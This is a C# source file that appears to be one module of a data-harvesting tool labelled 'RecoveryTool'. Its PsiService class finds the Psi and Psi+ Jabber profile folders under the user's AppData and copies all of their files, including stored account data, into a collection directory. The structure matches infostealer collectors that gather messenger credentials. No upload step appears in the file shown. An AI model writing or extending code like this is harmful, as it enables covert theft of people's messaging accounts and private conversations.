using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger.Jabber
{
    public class PsiService
    {
        private static readonly string[] PsiPaths =
        [
            Path.Combine(Common.AppData, "Psi+", "profiles", "default"),
            Path.Combine(Common.AppData, "Psi", "profiles", "default")
        ];

        public static async Task SavePsiAsync()
        {
            List<string> existingPsiPaths = [];

            foreach (string psiPath in PsiPaths)
            {
                if (Directory.Exists(psiPath) && Directory.EnumerateFiles(psiPath).Any())
                {
                    existingPsiPaths.Add(psiPath);
                }
            }

            if (existingPsiPaths.Any())
            {
                string savePsiPath = Common.EnsurePsiPath();

                foreach (string psiPath in existingPsiPaths)
                {
                    string psiType = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(psiPath)));
                    string destinationPath = Path.Combine(savePsiPath, "Jabber", psiType, "profiles", "default");
                    await MessengerHelper.CopyFilesAsync(psiPath, destinationPath, fi => true);
                }
            }
        }
    }
}